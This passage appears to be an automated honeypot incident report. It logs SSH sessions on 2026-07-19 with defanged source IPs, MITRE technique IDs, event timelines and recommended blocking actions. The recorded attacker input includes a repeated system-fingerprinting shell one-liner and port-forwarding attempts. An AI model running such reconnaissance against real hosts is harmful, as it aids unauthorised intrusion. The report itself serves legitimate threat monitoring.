| `2026-07-19 05:25:37` | `cowrie.log.closed` |
| `2026-07-19 05:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b883a1a8c081

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:27 |
| **Last Seen** | 2026-07-19 05:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:27:28` | `cowrie.session.connect` |
| `2026-07-19 05:27:29` | `cowrie.client.version` |
| `2026-07-19 05:27:29` | `cowrie.client.kex` |
| `2026-07-19 05:27:30` | `cowrie.login.success` |
| `2026-07-19 05:27:31` | `cowrie.session.params` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.success` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.command.input` |
| `2026-07-19 05:27:31` | `cowrie.log.closed` |
| `2026-07-19 05:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8442086f6e

| Field | Detail |
|---|---|
| **Source IP** | `220.163.252[.]244` |
| **First Seen** | 2026-07-19 05:28 |
| **Last Seen** | 2026-07-19 05:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:28:32` | `cowrie.session.connect` |
| `2026-07-19 05:28:34` | `cowrie.client.version` |
| `2026-07-19 05:28:34` | `cowrie.client.kex` |
| `2026-07-19 05:28:37` | `cowrie.login.success` |
| `2026-07-19 05:28:38` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.163.252[.]244` to AbuseIPDB if not already reported
- [ ] Block `220.163.252[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ccafe0542f0

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-19 05:28 |
| **Last Seen** | 2026-07-19 05:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:28:48` | `cowrie.session.connect` |
| `2026-07-19 05:28:49` | `cowrie.client.version` |
| `2026-07-19 05:28:49` | `cowrie.client.kex` |
| `2026-07-19 05:28:51` | `cowrie.login.success` |
| `2026-07-19 05:28:52` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-714f48ed6c88

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:29 |
| **Last Seen** | 2026-07-19 05:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:29:16` | `cowrie.session.connect` |
| `2026-07-19 05:29:16` | `cowrie.client.version` |
| `2026-07-19 05:29:16` | `cowrie.client.kex` |
| `2026-07-19 05:29:17` | `cowrie.login.success` |
| `2026-07-19 05:29:19` | `cowrie.session.params` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.success` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.command.input` |
| `2026-07-19 05:29:19` | `cowrie.log.closed` |
| `2026-07-19 05:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd54d886b7b

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-19 05:30 |
| **Last Seen** | 2026-07-19 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:30:41` | `cowrie.session.connect` |
| `2026-07-19 05:30:41` | `cowrie.client.version` |
| `2026-07-19 05:30:41` | `cowrie.client.kex` |
| `2026-07-19 05:30:42` | `cowrie.login.success` |
| `2026-07-19 05:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b70e6f389f6

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-19 05:30 |
| **Last Seen** | 2026-07-19 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:30:41` | `cowrie.session.connect` |
| `2026-07-19 05:30:41` | `cowrie.client.version` |
| `2026-07-19 05:30:41` | `cowrie.client.kex` |
| `2026-07-19 05:30:42` | `cowrie.login.success` |
| `2026-07-19 05:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f27b5315e30b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:30 |
| **Last Seen** | 2026-07-19 05:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:30:58` | `cowrie.session.connect` |
| `2026-07-19 05:30:59` | `cowrie.client.version` |
| `2026-07-19 05:30:59` | `cowrie.client.kex` |
| `2026-07-19 05:31:00` | `cowrie.login.success` |
| `2026-07-19 05:31:01` | `cowrie.session.params` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.success` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:01` | `cowrie.command.input` |
| `2026-07-19 05:31:02` | `cowrie.log.closed` |
| `2026-07-19 05:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07dbb7400e41

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 05:31 |
| **Last Seen** | 2026-07-19 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:31:26` | `cowrie.session.connect` |
| `2026-07-19 05:31:26` | `cowrie.client.version` |
| `2026-07-19 05:31:26` | `cowrie.client.kex` |
| `2026-07-19 05:31:26` | `cowrie.login.success` |
| `2026-07-19 05:31:27` | `cowrie.session.params` |
| `2026-07-19 05:31:27` | `cowrie.command.input` |
| `2026-07-19 05:31:27` | `cowrie.log.closed` |
| `2026-07-19 05:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7495ff18d9

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-19 05:32 |
| **Last Seen** | 2026-07-19 05:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:32:03` | `cowrie.session.connect` |
| `2026-07-19 05:32:04` | `cowrie.client.version` |
| `2026-07-19 05:32:04` | `cowrie.client.kex` |
| `2026-07-19 05:32:06` | `cowrie.login.success` |
| `2026-07-19 05:32:06` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf6ab792f66

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:32 |
| **Last Seen** | 2026-07-19 05:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:32:41` | `cowrie.session.connect` |
| `2026-07-19 05:32:42` | `cowrie.client.version` |
| `2026-07-19 05:32:42` | `cowrie.client.kex` |
| `2026-07-19 05:32:44` | `cowrie.login.success` |
| `2026-07-19 05:32:45` | `cowrie.session.params` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.success` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.command.input` |
| `2026-07-19 05:32:45` | `cowrie.log.closed` |
| `2026-07-19 05:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff426ae02122

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:34 |
| **Last Seen** | 2026-07-19 05:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:34:25` | `cowrie.session.connect` |
| `2026-07-19 05:34:26` | `cowrie.client.version` |
| `2026-07-19 05:34:26` | `cowrie.client.kex` |
| `2026-07-19 05:34:27` | `cowrie.login.success` |
| `2026-07-19 05:34:29` | `cowrie.session.params` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.success` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.command.input` |
| `2026-07-19 05:34:29` | `cowrie.log.closed` |
| `2026-07-19 05:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-386c73a0feed

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:36 |
| **Last Seen** | 2026-07-19 05:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:36:12` | `cowrie.session.connect` |
| `2026-07-19 05:36:12` | `cowrie.client.version` |
| `2026-07-19 05:36:12` | `cowrie.client.kex` |
| `2026-07-19 05:36:13` | `cowrie.login.success` |
| `2026-07-19 05:36:14` | `cowrie.session.params` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.success` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:14` | `cowrie.command.input` |
| `2026-07-19 05:36:15` | `cowrie.log.closed` |
| `2026-07-19 05:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b002a7a08f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:38 |
| **Last Seen** | 2026-07-19 05:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:38:00` | `cowrie.session.connect` |
| `2026-07-19 05:38:00` | `cowrie.client.version` |
| `2026-07-19 05:38:00` | `cowrie.client.kex` |
| `2026-07-19 05:38:01` | `cowrie.login.success` |
| `2026-07-19 05:38:02` | `cowrie.session.params` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.success` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:02` | `cowrie.command.input` |
| `2026-07-19 05:38:03` | `cowrie.log.closed` |
| `2026-07-19 05:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-250516ddc6ab

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-19 05:38 |
| **Last Seen** | 2026-07-19 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:38:39` | `cowrie.session.connect` |
| `2026-07-19 05:38:39` | `cowrie.client.version` |
| `2026-07-19 05:38:39` | `cowrie.client.kex` |
| `2026-07-19 05:38:39` | `cowrie.login.success` |
| `2026-07-19 05:38:39` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:38:40` | `cowrie.direct-tcpip.data` |
| `2026-07-19 05:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6016d5c96a0

| Field | Detail |
|---|---|
| **Source IP** | `173.255.221[.]189` |
| **First Seen** | 2026-07-19 05:38 |
| **Last Seen** | 2026-07-19 05:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:38:44` | `cowrie.session.connect` |
| `2026-07-19 05:38:44` | `cowrie.login.success` |
| `2026-07-19 05:38:44` | `cowrie.session.params` |
| `2026-07-19 05:38:44` | `cowrie.command.input` |
| `2026-07-19 05:38:44` | `cowrie.command.failed` |
| `2026-07-19 05:38:44` | `cowrie.command.input` |
| `2026-07-19 05:38:44` | `cowrie.command.failed` |
| `2026-07-19 05:38:44` | `cowrie.command.input` |
| `2026-07-19 05:38:44` | `cowrie.command.failed` |
| `2026-07-19 05:38:44` | `cowrie.command.input` |
| `2026-07-19 05:38:46` | `cowrie.log.closed` |
| `2026-07-19 05:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.255.221[.]189` to AbuseIPDB if not already reported
- [ ] Block `173.255.221[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd0c97d0f432

| Field | Detail |
|---|---|
| **Source IP** | `66.228.53[.]162` |
| **First Seen** | 2026-07-19 05:39 |
| **Last Seen** | 2026-07-19 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:39:10` | `cowrie.session.connect` |
| `2026-07-19 05:39:10` | `cowrie.login.success` |
| `2026-07-19 05:39:11` | `cowrie.session.params` |
| `2026-07-19 05:39:11` | `cowrie.command.input` |
| `2026-07-19 05:39:11` | `cowrie.command.input` |
| `2026-07-19 05:39:11` | `cowrie.command.failed` |
| `2026-07-19 05:39:11` | `cowrie.command.input` |
| `2026-07-19 05:39:11` | `cowrie.command.failed` |
| `2026-07-19 05:39:11` | `cowrie.command.input` |
| `2026-07-19 05:39:11` | `cowrie.log.closed` |
| `2026-07-19 05:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.53[.]162` to AbuseIPDB if not already reported
- [ ] Block `66.228.53[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4df0df3233b1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:39 |
| **Last Seen** | 2026-07-19 05:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:39:51` | `cowrie.session.connect` |
| `2026-07-19 05:39:51` | `cowrie.client.version` |
| `2026-07-19 05:39:51` | `cowrie.client.kex` |
| `2026-07-19 05:39:52` | `cowrie.login.success` |
| `2026-07-19 05:39:54` | `cowrie.session.params` |
